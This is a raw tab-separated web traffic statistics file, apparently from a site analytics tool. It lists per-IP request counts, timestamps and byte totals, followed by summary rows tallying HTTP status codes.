5	0	0	2	1	0	24502691	24502691	0	24501993	24502691	0	157.55.39.247
5	0	0	6	2	0	24521458	24521458	0	24517552	24517551	0	157.55.39.246
5	0	0	0	1	0	0	24508286	0	0	24508286	0	172.68.10.75
5	3	0	0	0	24436288	0	0	24435123	0	0	89487	108.162.210.205
5	0	0	1	1	0	24442665	24442665	0	24442665	24442665	0	157.55.39.238
5	0	0	1	0	0	24436157	0	0	24436157	0	0	115.28.168.151
5	2	0	2	0	24494433	24494433	0	24494433	24494433	0	6362	54.205.201.120
5	1	0	1	0	24452225	24452225	0	24452225	24452225	0	3181	172.68.10.66
5	0	0	1	1	0	24564969	24564888	0	24564969	24564888	0	157.55.39.234
5	1	0	0	0	24486585	0	0	24486585	0	0	3181	199.27.133.134
5	1	0	1	0	24588468	24588468	0	24588468	24588468	0	3181	172.68.10.63
5	2	0	0	0	24436418	0	0	24435122	0	0	6362	141.101.105.165
5	0	0	2	1	0	24582848	24582847	0	24582302	24582847	0	157.55.39.231
5	2	0	2	0	24548048	24548048	0	24485381	24485381	0	6362	141.101.105.161
5	0	0	0	1	0	0	24477769	0	0	24477769	0	157.55.39.221
5	0	0	1	0	0	24448623	0	0	24448623	0	0	173.245.52.101
5	0	0	2	0	0	24523137	0	0	24522443	0	0	40.77.167.105
5	0	0	1	0	0	24484193	0	0	24484193	0	0	157.55.39.213
5	0	0	1	0	0	24528985	0	0	24528985	0	0	157.55.39.211
5	1	0	0	1	24493977	0	24493976	24493977	0	24493976	68411	157.55.39.208
5	0	0	2	1	0	24592757	24592332	0	24591572	24592332	0	157.55.39.207
5	0	0	1	1	0	24595072	24595072	0	24595072	24595072	0	157.55.39.206
5	0	0	0	2	0	0	24591937	0	0	24591937	0	108.162.245.123
5	0	0	1	1	0	24568316	24568316	0	24568316	24568316	0	157.55.39.194
5	4	0	0	0	24591981	0	0	24450475	0	0	357948	108.162.245.121
5	2	0	0	0	24436418	0	0	24435122	0	0	17404	141.101.105.135
5	0	0	0	1	0	0	24572913	0	0	24572913	0	157.55.39.190
5	5	0	3	0	24597139	24597139	0	24451839	24451839	0	15104	162.158.93.171
5	5	0	0	0	24592748	0	0	24451042	0	0	15905	108.162.245.115
5	0	0	0	20	0	0	24593301	0	0	24450475	0	108.162.245.114
5	1	0	1	2	24498062	24459513	24493972	24498062	24459513	24493972	3181	157.55.39.186
5	5	0	0	0	24591981	0	0	24450475	0	0	342055	108.162.245.110
5	0	0	0	1	0	0	24479002	0	0	24479002	0	162.158.93.164
5	0	0	0	1	0	0	24441128	0	0	24441128	0	162.158.39.92
5	0	0	0	1	0	0	24580483	0	0	24580483	0	162.158.39.91
5	0	0	0	2	0	0	24503952	0	0	24503952	0	108.162.245.106
5	2	0	1	0	24436541	24436541	0	24435122	24436541	0	6362	162.158.39.90
5	2	0	0	0	24514959	0	0	24514959	0	0	0	157.55.39.180
5	0	0	1	0	0	24529723	0	0	24529723	0	0	157.55.39.177
5	2	0	9	2	24493972	24497280	24495847	24493972	24492282	24492282	92668	157.55.39.176
5	10	1	1	0	24435690	24435681	0	24435681	24435681	0	143579	162.158.177.179
5	1	0	1	0	24508919	24508919	0	24508919	24508919	0	3181	108.61.226.10
5	0	0	3	0	0	24532938	0	0	24531148	0	0	157.55.39.168
5	0	0	1	0	0	24518752	0	0	24518752	0	0	162.158.93.148
5	2	0	0	0	24526276	0	0	24526276	0	0	140690	157.55.39.165
5	2	0	0	0	24455536	0	0	24439534	0	0	136822	172.68.34.196
5	4	0	0	0	24455362	0	0	24437715	0	0	12724	172.68.34.205
5	1	0	0	0	24435122	0	0	24435122	0	0	3181	172.68.34.195
5	0	0	3	1	0	24486259	24484882	0	24484882	24484882	0	157.55.39.164
5	2	0	0	0	24455536	0	0	24439534	0	0	53358	172.68.34.204
5	2	0	6	0	24455536	24456345	0	24439534	24437715	0	178974	172.68.34.194
5	0	0	1	2	0	24577225	24577773	0	24577225	24577224	0	157.55.39.161
5	0	0	0	1	0	0	24479152	0	0	24479152	0	157.55.39.159
5	0	0	1	1	0	24477915	24477658	0	24477915	24477658	0	157.55.39.160
5	1	0	2	0	24446869	24448023	0	24446869	24446869	0	3181	157.55.39.158
5	1	0	0	0	24477761	0	0	24477761	0	0	68411	157.55.39.157
5	0	0	3	0	0	24597924	0	0	24596466	0	0	157.55.39.154
5	0	0	1	0	0	24440560	0	0	24440560	0	0	157.55.39.151
5	1	0	1	0	24514850	24514850	0	24514850	24514850	0	3181	157.55.39.148
5	0	0	1	1	0	24598618	24598618	0	24598618	24598618	0	157.55.39.146
5	0	0	1	0	0	24436157	0	0	24436157	0	0	121.42.42.175
5	1	0	0	0	24435690	0	0	24435690	0	0	7708	108.162.223.245
5	0	0	3	3	0	24446396	24445705	0	24445140	24445000	0	157.55.39.143
5	0	0	2	1	0	24507184	24506456	0	24506456	24506456	0	40.77.167.95
5	1	0	1	0	24520995	24520995	0	24520995	24520995	0	3181	195.154.146.225
5	0	0	1	0	0	24580109	0	0	24580109	0	0	108.162.245.96
5	0	0	2	0	0	24482140	0	0	24472297	0	0	157.55.39.134
5	1	0	1	0	24531812	24531812	0	24531812	24531812	0	3181	108.162.245.93
5	1	0	0	0	24435681	0	0	24435681	0	0	16593	108.162.223.233
5	0	0	1	0	0	24509305	0	0	24509305	0	0	40.77.167.89
5	0	0	2	0	0	24535993	0	0	24535253	0	0	40.77.167.88
5	1	0	0	0	24580164	0	0	24580164	0	0	0	157.55.39.130
5	0	0	1	0	0	24504844	0	0	24504844	0	0	157.55.39.127
5	0	0	1	1	0	24572024	24572024	0	24572024	24572024	0	40.77.167.85
5	2	0	0	0	24435682	0	0	24435681	0	0	263131	108.162.223.227
5	0	0	1	2	0	24480071	24479954	0	24480071	24479835	0	40.77.167.84
5	1	0	0	0	24435682	0	0	24435682	0	0	46821	162.158.177.131
5	0	0	2	1	0	24460877	24460193	0	24460193	24460193	0	40.77.167.83
5	0	0	0	2	0	0	24548588	0	0	24478280	0	157.55.39.123
5	0	0	1	0	0	24504127	0	0	24504127	0	0	40.77.167.81
5	2	0	0	0	24510161	0	0	24510161	0	0	140690	40.77.167.77
5	0	0	1	1	0	24584251	24584249	0	24584251	24584249	0	40.77.167.76
5	0	0	0	1	0	0	24523666	0	0	24523666	0	157.55.39.118
5	1	0	1	0	24594326	24594326	0	24594326	24594326	0	3181	173.245.54.229
5	0	0	1	1	0	24586352	24586352	0	24586352	24586352	0	157.55.39.117
5	1	0	0	0	24435681	0	0	24435681	0	0	12315	108.162.223.215
5	1	0	0	0	24514955	0	0	24514955	0	0	0	157.55.39.113
5	0	0	1	1	0	24455372	24455371	0	24455372	24455371	0	40.77.167.69
5	2	0	2	2	24565293	24565647	24565647	24565292	24565292	24565292	92668	157.55.39.111
5	0	0	0	2	0	0	24505330	0	0	24505330	0	108.162.245.72
5	0	0	1	0	0	24497965	0	0	24497965	0	0	40.77.167.67
5	1	0	0	0	24435681	0	0	24435681	0	0	6601	108.162.223.209
5	0	0	2	0	0	24463493	0	0	24462947	0	0	157.55.39.108
5	1	0	4	1	24454657	24454657	24453102	24454657	24452415	24453102	3181	40.77.167.61
5	0	0	1	1	0	24469103	24468951	0	24469103	24468951	0	40.77.167.60
5	1	0	0	0	24435690	0	0	24435690	0	0	17404	108.162.223.191
5	0	0	1	0	0	24482820	0	0	24482820	0	0	157.55.39.100
5	0	0	4	1	0	24594378	24563127	0	24563128	24563127	0	40.77.167.55
5	0	0	1	0	0	24473009	0	0	24473009	0	0	40.77.167.54
5	2	0	1	0	24493973	24468261	0	24493973	24468261	0	140690	40.77.167.52
5	0	0	1	0	0	24458150	0	0	24458150	0	0	40.77.167.51
5	0	0	5	5	0	24560510	24560077	0	24557744	24557744	0	40.77.167.50
5	1	0	3	1	24449513	24587102	24449513	24449513	24448728	24449513	3181	40.77.167.48
5	2	0	0	0	24436418	0	0	24435193	0	0	17404	173.245.54.191
5	0	0	1	0	0	24487869	0	0	24487869	0	0	40.77.167.44
5	15	0	0	0	24556088	0	0	24445448	0	0	1163331	173.245.54.184
5	15	0	0	0	24556088	0	0	24445448	0	0	820932	173.245.54.181
5	0	0	1	0	0	24536719	0	0	24536719	0	0	40.77.167.35
5	1	0	1	0	24571533	24571533	0	24571533	24571533	0	3181	173.245.48.229
5	0	0	3	2	0	24440561	24509012	0	24437690	24509012	0	173.245.54.174
5	1	0	0	0	24435681	0	0	24435681	0	0	6753	108.162.223.161
5	1	1	31	1	24434959	24556088	24462293	24434959	24437215	24462293	203	173.245.54.172
5	0	0	1	0	0	24514276	0	0	24514276	0	0	40.77.167.25
5	0	0	0	1	0	0	24434959	0	0	24434959	0	173.245.54.166
5	0	0	1	0	0	24505750	0	0	24505750	0	0	40.77.167.22
5	1	0	1	0	24466844	24466844	0	24466844	24466844	0	3181	162.158.166.151
5	1	0	0	0	24564465	0	0	24564465	0	0	3181	162.158.166.150
5	1	0	1	0	24536518	24536518	0	24536518	24536518	0	3181	173.245.54.163
5	0	0	2	2	0	24568029	24567713	0	24567013	24567013	0	40.77.167.18
5	5	0	4	2	24522206	24522206	24522205	24522205	24522205	24522205	15104	72.76.221.220
5	0	0	1	0	0	24470917	0	0	24470917	0	0	40.77.167.16
5	0	0	0	1	0	0	24459133	0	0	24459133	0	173.245.54.160
5	1	0	1	1	24455165	24455165	24455165	24455165	24455165	24455165	3181	216.145.17.190
5	0	0	1	1	0	24585683	24585682	0	24585683	24585682	0	40.77.167.11
5	2	0	0	0	24588930	0	0	24588930	0	0	140690	40.77.167.10
5	0	0	1	0	0	24452700	0	0	24452700	0	0	104.156.231.254
5	0	0	5	2	0	24513567	24513567	0	24474654	24474378	0	207.46.13.91
5	0	0	1	1	0	24481518	24481209	0	24481518	24481209	0	207.46.13.90
5	0	0	1	0	0	24490108	0	0	24490108	0	0	207.46.13.89
5	2	0	1	1	24491993	24491993	24491993	24435681	24491993	24491993	9209	108.162.223.131
5	0	0	0	2	0	0	24477830	0	0	24477770	0	207.46.13.87
5	2	0	0	0	24435331	0	0	24435122	0	0	26679	141.101.81.121
5	2	0	0	0	24438426	0	0	24438426	0	0	140690	207.46.13.86
5	2	0	0	0	24435398	0	0	24435142	0	0	5178	141.101.81.120
5	1	0	0	0	24435150	0	0	24435150	0	0	9614	141.101.81.118
5	4	0	0	0	24435398	0	0	24435122	0	0	124140	141.101.81.117
5	2	0	0	0	24435398	0	0	24435142	0	0	1456	141.101.81.116
5	2	0	4	2	24555752	24557064	24557062	24555725	24555725	24555725	3181	207.46.13.82
5	3	0	3	1	24565293	24462250	24462249	24461962	24461962	24462249	74773	207.46.13.81
5	0	0	1	0	0	24456075	0	0	24456075	0	0	207.46.13.80
5	2	2	0	0	24435099	0	0	24435099	0	0	2066	45.32.128.51
5	2	0	0	0	24435398	0	0	24435142	0	0	6028	141.101.81.113
5	0	0	1	1	0	24461574	24461574	0	24461574	24461574	0	207.46.13.75
5	2	0	1	1	24580164	24475457	24580164	24580164	24475457	24580164	0	207.46.13.68
5	1	0	0	0	24573826	0	0	24573826	0	0	11978	162.158.255.214
5	0	0	1	1	0	24563820	24563820	0	24563820	24563820	0	207.46.13.63
5	0	0	2	0	0	24444312	0	0	24443613	0	0	207.46.13.59
5	2	0	2	0	24477761	24533717	0	24477760	24477760	0	92668	207.46.13.58
5	0	0	5	0	0	24556088	0	0	24475297	0	0	162.158.255.205
5	0	0	4	1	0	24466946	24466255	0	24464868	24466255	0	207.46.13.56
5	1	0	2	0	24460085	24562645	0	24460085	24460085	0	3181	141.101.97.95
5	1	0	1	0	24472401	24516126	0	24472401	24516126	0	3181	162.158.255.191
5	0	0	1	0	0	24475297	0	0	24475297	0	0	162.158.255.201
5	0	0	0	1	0	0	24593005	0	0	24593005	0	207.46.13.51
5	0	0	1	1	0	24568999	24568999	0	24568999	24568999	0	207.46.13.49
5	0	0	2	2	0	24574077	24574076	0	24573391	24573391	0	207.46.13.50
5	0	0	1	1	0	24464208	24464180	0	24464208	24464180	0	207.46.13.47
5	1	0	1	0	24479943	24479943	0	24479943	24479943	0	3181	141.101.97.91
5	1	0	3	2	24467860	24576715	24576317	24467860	24467492	24574839	2380	207.46.13.45
5	1	0	1	0	24597501	24597501	0	24597501	24597501	0	3181	149.202.206.103
5	2	0	5	2	24526276	24527973	24526551	24526276	24525853	24525853	92668	207.46.13.42
5	0	0	2	2	0	24545702	24477176	0	24477176	24476851	0	207.46.13.41
5	0	0	2	0	0	24524556	0	0	24523873	0	0	207.46.13.40
5	1	0	0	0	24469339	0	0	24469339	0	0	3181	45.32.129.1
5	0	0	1	0	0	24507888	0	0	24507888	0	0	207.46.13.38
5	0	0	1	0	0	24587762	0	0	24587762	0	0	207.46.13.34
5	1	0	0	0	24486585	0	0	24486585	0	0	1887	162.158.255.169
5	6	0	0	0	24497469	0	0	24497469	0	0	247724	82.80.230.228
5	1	0	1	1	24572911	24572911	24572910	24572911	24572911	24572910	3181	207.46.13.22
5	2	0	0	0	24565292	0	0	24565292	0	0	140690	207.46.13.21
5	3	0	2	1	24438626	24439875	24438425	24438425	24438425	24438425	95048	207.46.13.20
5	2	0	2	2	24501159	24501159	24501159	24477820	24477820	24477820	6362	64.246.165.200
5	2	0	3	0	24548203	24523750	0	24486585	24504361	0	136822	162.158.255.153
5	0	0	0	2	0	0	24496948	0	0	24496327	0	141.101.99.7
5	4	0	4	0	24493205	24493205	0	24493205	24493205	0	12724	151.236.220.15
5	1	0	1	1	24442937	24442937	24442937	24442937	24442937	24442937	3181	162.158.176.95
5	1	0	0	0	24486585	0	0	24486585	0	0	17404	162.158.255.126
5	1	0	0	0	24435682	0	0	24435682	0	0	5877	162.158.176.77
5	1	0	1	1	24524665	24524665	24524665	24524665	24524665	24524665	3181	64.246.165.150
5	1	0	0	0	24576623	0	0	24576623	0	0	17404	162.158.17.90
5	1	1	0	0	24435117	0	0	24435117	0	0	1033	172.68.11.75
5	1	0	1	1	24581213	24581213	24581213	24581213	24581213	24581213	3181	162.158.108.203
5	4	0	4	0	24473549	24473549	0	24444750	24444750	0	12724	172.68.11.62
5	1	0	1	0	24572931	24572931	0	24572931	24572931	0	3181	162.158.17.66
5	5	0	2	0	24576623	24576623	0	24576623	24576623	0	40946	162.158.17.60
5	2	0	1	0	24559917	24559917	0	24559917	24559917	0	6362	199.27.133.86
5	1	0	0	0	24576623	0	0	24576623	0	0	68411	162.158.17.54
5	2	0	0	0	24436418	0	0	24435193	0	0	6362	173.245.56.184
5	1	0	1	1	24455999	24455999	24455999	24455999	24455999	24455999	3181	162.158.176.17
5	1	0	1	0	24446092	24446092	0	24446092	24446092	0	3181	173.245.56.182
5	0	0	0	2	0	0	24506762	0	0	24506762	0	173.245.56.179
5	0	0	0	12	0	0	24506882	0	0	24437214	0	173.245.56.176
5	2	0	0	0	24576623	0	0	24576623	0	0	130604	162.158.17.42
5	12	0	0	0	24556088	0	0	24445448	0	0	199116	173.245.56.174
5	32	0	0	0	24556088	0	0	24437215	0	0	101792	173.245.56.173
5	1	0	0	0	24446092	0	0	24446092	0	0	42567	173.245.56.172
5	15	0	0	0	24556088	0	0	24445448	0	0	1596154	173.245.56.171
5	1	0	0	0	24576623	0	0	24576623	0	0	89487	162.158.17.36
5	1	0	35	0	24487737	24508315	0	24487737	24452431	0	3181	173.245.56.167
5	1	0	1	0	24457508	24457508	0	24457508	24457508	0	3181	173.245.56.163
5	1	0	1	0	24497811	24497811	0	24497811	24497811	0	3181	173.245.56.162
5	13	0	0	0	24556088	0	0	24437220	0	0	30940	173.245.56.159
5	0	0	1	0	0	24596527	0	0	24596527	0	0	199.27.133.57
5	1	0	0	0	24475297	0	0	24475297	0	0	89487	173.245.56.157
5	1	0	0	0	24576623	0	0	24576623	0	0	1887	162.158.17.24
5	1	0	1	1	24551972	24551972	24551972	24551972	24551972	24551972	3181	162.158.108.125
5	16	0	1	0	24556088	24511330	0	24445448	24511330	0	376687	173.245.56.140
5	1	0	1	0	24557987	24557987	0	24557987	24557987	0	3181	162.158.192.11
5	0	0	1	0	0	24566870	0	0	24566870	0	0	108.162.219.166
5	1	0	1	0	24611121	24611121	0	24611121	24611121	0	3181	104.236.201.33
5	1	0	0	0	24435681	0	0	24435681	0	0	114011	108.162.223.53
5	1	0	1	0	24557172	24557172	0	24557172	24557172	0	3181	141.101.66.245
5	0	0	1	0	0	24477075	0	0	24477075	0	0	108.162.219.162
5	5	0	0	0	24573826	0	0	24559917	0	0	26679	199.27.133.30
5	1	0	0	0	24573826	0	0	24573826	0	0	8987	199.27.133.27
5	3	0	2	0	24595824	24595824	0	24573826	24573826	0	6362	199.27.133.24
5	8	0	2	0	24571533	24571533	0	24440107	24440107	0	18924	69.84.207.246
5	1	0	0	0	24454853	0	0	24454853	0	0	3181	199.27.133.19
5	0	0	50	0	0	24592748	0	0	24436497	0	0	108.162.246.95
5	0	0	0	3	0	0	24483916	0	0	24483916	0	108.162.219.148
5	0	0	1	0	0	24436851	0	0	24436851	0	0	162.158.56.77
5	0	0	1	0	0	24567542	0	0	24567542	0	0	108.162.219.143
5	1	0	1	0	24564947	24564947	0	24564947	24564947	0	3181	108.162.219.141
5	1	0	0	0	24573826	0	0	24573826	0	0	1152	199.27.133.10
5	0	0	0	1	0	0	24581383	0	0	24581383	0	141.101.104.214
5	1	0	1	0	24476251	24476251	0	24476251	24476251	0	3181	108.162.219.139
5	0	0	1	0	0	24605993	0	0	24605993	0	0	159.203.161.175
5	0	0	1	0	0	24448623	0	0	24448623	0	0	162.243.245.163
5	0	0	0	1	0	0	24570471	0	0	24570471	0	172.68.65.86
5	5	0	0	2	24591981	0	24511614	24450475	0	24511614	456044	108.162.246.73
5	1	0	16	20	24561474	24586946	24576055	24561474	24445448	24524132	3181	108.162.246.69
5	0	0	1	0	0	24510771	0	0	24510771	0	0	104.236.87.148
5	1	0	0	0	24435681	0	0	24435681	0	0	11543	162.158.176.245
5	0	0	1	0	0	24476556	0	0	24476556	0	0	108.162.219.104
5	0	0	0	2	0	0	24590035	0	0	24590035	0	172.68.65.60
5	2	0	2	0	24589912	24589912	0	24589912	24589912	0	6362	141.101.105.97
5	0	0	0	1	0	0	24558190	0	0	24558190	0	172.68.65.50
5	1	0	1	0	24515798	24515798	0	24515798	24515798	0	3181	141.101.105.82
5	0	0	0	5	0	0	24547438	0	0	24502818	0	198.41.230.222
5	0	0	19	0	0	24552158	0	0	24514334	0	0	198.41.230.221
5	1	0	1	0	24511710	24511710	0	24511710	24511710	0	3181	198.41.230.219
5	1	0	1	1	24466347	24466347	24466347	24466347	24466347	24466347	3181	162.158.92.173
5	0	0	1	0	0	24479447	0	0	24479447	0	0	162.158.92.162
5	4	0	0	0	24597026	0	0	24558190	0	0	205233	172.68.65.10
5	1	0	0	0	24435682	0	0	24435682	0	0	8433	162.158.176.173
5	1	0	1	0	24476786	24476786	0	24476786	24476786	0	3181	45.55.242.196
5	0	0	0	1	0	0	24466745	0	0	24466745	0	141.101.66.113
5	1	0	0	0	24435681	0	0	24435681	0	0	84247	162.158.176.161
5	1	0	1	0	24575580	24575580	0	24575580	24575580	0	3181	141.101.66.107
5	1	0	1	0	24593387	24593387	0	24593387	24593387	0	3181	108.162.212.54
5	0	0	0	1	0	0	24553308	0	0	24553308	0	203.35.67.20
5	6	0	0	0	24436412	0	0	24435169	0	0	152033	108.162.212.50
5	1	0	1	0	24440107	24440107	0	24440107	24440107	0	3181	162.158.56.161
5	4	0	0	0	24436414	0	0	24435123	0	0	103934	108.162.212.47
5	8	0	0	0	24436288	0	0	24435169	0	0	337016	108.162.212.46
5	1	0	0	0	24435185	0	0	24435185	0	0	46821	108.162.212.45
5	1	0	1	1	24594083	24594083	24594083	24594083	24594083	24594083	3181	64.246.165.50
5	1	0	0	0	24435681	0	0	24435681	0	0	21587	108.162.222.241
5	9	0	0	1	24436415	0	24434988	24435123	0	24434988	207540	108.162.212.44
5	4	0	0	0	24436288	0	0	24435169	0	0	39465	108.162.212.43
5	4	0	0	0	24436288	0	0	24435169	0	0	47158	108.162.212.39
5	12	0	0	0	24436288	0	0	24435123	0	0	123007	108.162.212.40
5	1	0	0	0	24435681	0	0	24435681	0	0	13490	108.162.222.235
5	2	0	0	0	24436288	0	0	24435169	0	0	4998	108.162.212.38
5	2	0	0	0	24435681	0	0	24435681	0	0	27831	162.158.176.137
5	1	0	1	0	24435717	24435717	0	24435717	24435717	0	3181	108.162.212.36
5	1	0	0	0	24436409	0	0	24436409	0	0	50110	108.162.212.35
5	1	0	0	0	24435681	0	0	24435681	0	0	13857	108.162.222.232
5	2	0	0	0	24436288	0	0	24435123	0	0	6753	108.162.212.34
5	1	0	0	0	24435681	0	0	24435681	0	0	68411	108.162.222.229
5	1	0	0	0	24435123	0	0	24435123	0	0	1887	108.162.212.33
5	2	0	0	0	24435690	0	0	24435682	0	0	0	108.162.222.230
5	2	0	0	0	24436288	0	0	24435169	0	0	50951	108.162.212.31
5	2	0	0	0	24435682	0	0	24435681	0	0	26396	108.162.222.227
5	1	0	0	0	24435681	0	0	24435681	0	0	337	162.158.176.131
5	1	0	0	0	24435682	0	0	24435682	0	0	4998	108.162.222.226
5	2	0	0	0	24436288	0	0	24435169	0	0	5178	108.162.212.30
5	2	0	0	0	24436289	0	0	24435184	0	0	14961	108.162.212.28
5	4	0	0	0	24436288	0	0	24435169	0	0	27464	108.162.212.27
5	2	0	0	0	24436288	0	0	24435184	0	0	646	108.162.212.25
5	2	0	0	0	24436288	0	0	24435169	0	0	6028	108.162.212.24
5	2	0	0	0	24436288	0	0	24435169	0	0	434957	108.162.212.22
5	1	0	0	0	24435681	0	0	24435681	0	0	2626	108.162.222.217
5	3	0	0	0	24436288	0	0	24435169	0	0	36617	108.162.212.19
5	4	0	0	0	24436288	0	0	24435169	0	0	13717	108.162.212.20
5	4	0	0	0	24436289	0	0	24435184	0	0	73488	108.162.212.18
5	3	0	2	0	24439764	24439764	0	24435681	24439764	0	95849	108.162.222.212
5	0	0	0	4	0	0	24436414	0	0	24435185	0	108.162.212.14
5	1	0	0	0	24435681	0	0	24435681	0	0	5644	108.162.222.211
5	0	0	1	0	0	24560075	0	0	24560075	0	0	45.55.214.72
5	1	0	0	0	24435185	0	0	24435185	0	0	84247	108.162.212.13
5	175	9	10	18	24436419	24436419	24435000	24434988	24435169	24434988	215252071	108.162.212.12
5	3	0	0	0	24436414	0	0	24435185	0	0	80432	108.162.212.11
5	4	0	0	0	24436288	0	0	24435169	0	0	16607	108.162.212.10
5	8	0	0	0	24546704	0	0	24502818	0	0	729688	198.41.230.120
5	8	0	0	0	24546704	0	0	24502818	0	0	464664	198.41.230.119
5	1	0	0	0	24435690	0	0	24435690	0	0	1887	108.162.222.203
5	2	0	0	0	24435681	0	0	24435681	0	0	38390	108.162.222.192
5	1	0	0	0	24435681	0	0	24435681	0	0	5178	108.162.222.202
5	1	0	1	1	24570693	24570693	24570693	24570693	24570693	24570693	3181	64.246.165.10
5	11	0	0	0	24548153	0	0	24514334	0	0	34991	198.41.230.114
5	1	0	0	0	24435681	0	0	24435681	0	0	4103	108.162.222.200
5	0	0	1	0	0	24470900	0	0	24470900	0	0	45.55.32.35
5	1	0	0	0	24435682	0	0	24435682	0	0	50951	162.158.177.95
5	1	0	1	0	24515239	24515239	0	24515239	24515239	0	3181	104.131.99.209
5	1	0	0	0	24573826	0	0	24573826	0	0	1887	199.27.128.250
5	1725	13	130	58	24833735	24833735	24832411	24434963	24639210	24434963	44924781	66.176.151.80
5	1	0	1	0	24496711	24496711	0	24496711	24496711	0	3181	86.126.98.158
5	2	0	2	0	24447520	24447520	0	24437045	24437045	0	6362	158.69.228.18
5	0	0	0	1	0	0	24553308	0	0	24553308	0	162.158.165.146
5	1	0	0	0	24573826	0	0	24573826	0	0	16666	199.27.128.230
5	1	0	1	0	24482317	24482317	0	24482317	24482317	0	3181	162.158.165.140
5	1	0	0	0	24573826	0	0	24573826	0	0	17404	199.27.128.216
5	1	0	1	0	24480126	24480126	0	24480126	24480126	0	3181	141.101.98.221
5	1	0	0	0	24573826	0	0	24573826	0	0	4753	199.27.128.214
5	1	0	1	0	24573855	24573855	0	24573855	24573855	0	3181	199.27.128.212
5	2	0	0	0	24435398	0	0	24435142	0	0	12315	141.101.80.120
5	2	0	0	0	24435398	0	0	24435142	0	0	4426	141.101.80.117
5	1	0	0	0	24573826	0	0	24573826	0	0	6753	199.27.128.197
5	2	0	0	0	24435398	0	0	24435142	0	0	46821	141.101.80.115
5	5	0	0	0	24573826	0	0	24559917	0	0	89487	199.27.128.205
5	88	7	13	3	24435398	24435398	24435119	24435111	24435122	24435116	986104	141.101.80.113
5	1	0	0	0	24486585	0	0	24486585	0	0	1152	199.27.128.202
5	1	0	0	0	24573826	0	0	24573826	0	0	12537	199.27.128.189
5	1	0	1	0	24583101	24583101	0	24583101	24583101	0	3181	199.27.128.186
5	1	0	0	0	24493091	0	0	24493091	0	0	3181	104.156.230.231
5	1	0	0	0	24573826	0	0	24573826	0	0	5174	199.27.128.183
5	2	0	0	0	24548203	0	0	24486585	0	0	53358	199.27.128.182
5	1	0	1	0	24564429	24564429	0	24564429	24564429	0	3181	159.203.97.111
5	5	0	0	0	24573826	0	0	24559917	0	0	114011	199.27.128.175
5	1	0	1	0	24500395	24500395	0	24500395	24500395	0	3181	188.114.103.178
5	1	0	0	0	24573826	0	0	24573826	0	0	3662	199.27.128.173
5	4	0	0	0	24435398	0	0	24435142	0	0	130904	141.101.80.79
5	1	0	0	0	24573826	0	0	24573826	0	0	3943	199.27.128.171
5	2	0	0	0	24435398	0	0	24435142	0	0	33679	141.101.80.75
5	1	0	0	0	24573826	0	0	24573826	0	0	8469	199.27.128.165
5	4	0	0	0	24435398	0	0	24435142	0	0	14194	141.101.80.73
5	2	0	0	0	24435398	0	0	24435142	0	0	50951	141.101.80.72
5	2	0	0	0	24435397	0	0	24435122	0	0	1887	141.101.80.70
5	1	0	0	0	24573826	0	0	24573826	0	0	16593	199.27.128.161
5	2	0	0	0	24435331	0	0	24435122	0	0	16593	141.101.80.68
5	2	0	0	0	24548203	0	0	24486585	0	0	178974	199.27.128.157
5	1	0	1	1	24558916	24558916	24558916	24558916	24558916	24558916	3181	141.101.66.5
5	4	0	0	0	24435398	0	0	24435142	0	0	9980	141.101.80.62
5	2	0	0	0	24435398	0	0	24435142	0	0	84247	141.101.80.61
5	1	0	0	0	24486585	0	0	24486585	0	0	16593	199.27.128.151
5	2	0	0	0	24548203	0	0	24486585	0	0	228022	199.27.128.149
5	0	0	0	1	0	0	24596527	0	0	24596527	0	199.27.128.146
5	6	0	49	0	24591981	24506479	0	24450475	24467217	0	135775	108.162.246.119
5	1	0	0	0	24486585	0	0	24486585	0	0	6753	199.27.128.143
5	0	0	11	0	0	24508630	0	0	24435290	0	0	108.162.246.116
5	2	0	0	0	24592002	0	0	24573124	0	0	4760	108.162.246.115
5	2	0	1	0	24548203	24548203	0	24548203	24548203	0	6362	199.27.128.139
5	0	0	0	1	0	0	24435117	0	0	24435117	0	108.162.229.247
5	0	0	0	1	0	0	24455428	0	0	24455428	0	141.101.93.183
5	0	0	4	2	0	24597026	24588146	0	24445449	24588146	0	108.162.246.109
5	5	0	0	0	24573826	0	0	24559917	0	0	68411	199.27.128.132
5	1	0	1	0	24526891	24526891	0	24526891	24526891	0	3181	199.27.128.129
5	0	0	1	0	0	24586946	0	0	24586946	0	0	199.27.128.125
5	1	1	0	0	24435117	0	0	24435117	0	0	1033	108.162.229.232
5	0	0	0	4	0	0	24455362	0	0	24439534	0	172.68.35.210
5	2	0	0	0	24455536	0	0	24439534	0	0	228022	172.68.35.208
5	2	0	0	0	24435331	0	0	24435122	0	0	68411	141.101.80.26
5	1	0	1	0	24444911	24444911	0	24444911	24444911	0	3181	162.158.23.227
5	1	0	0	0	24435122	0	0	24435122	0	0	17404	172.68.35.201
5	2	0	0	0	24435174	0	0	24435174	0	0	5068	108.162.229.215
5	1	0	1	0	24460675	24460675	0	24460675	24460675	0	3181	108.162.229.214
5	1	0	2	2	24588927	24588927	24588997	24588927	24588491	24438426	3181	207.46.13.186
5	0	0	0	1	0	0	24565292	0	0	24565292	0	207.46.13.183
5	2	0	0	0	24555752	0	0	24555752	0	0	0	207.46.13.179
5	0	0	2	1	0	24570610	24570362	0	24508614	24570362	0	207.46.13.178
z	0	202	3	24832396	0
z	1	2	0	24764565	7
z	2	1	0	24434988	39
z	3	435	6	24832412	225887
z	4	784	28	24833735	3126131
z	5	1306	0	24833602	41867746
z	6	129	0	24833602	25749944
z	9	2	0	24434989	213676050
c	200	2721	24833735
c	206	2	24764565
c	302	821	24833735
c	303	1	24435713
c	304	138	24580164
c	404	343	24832411
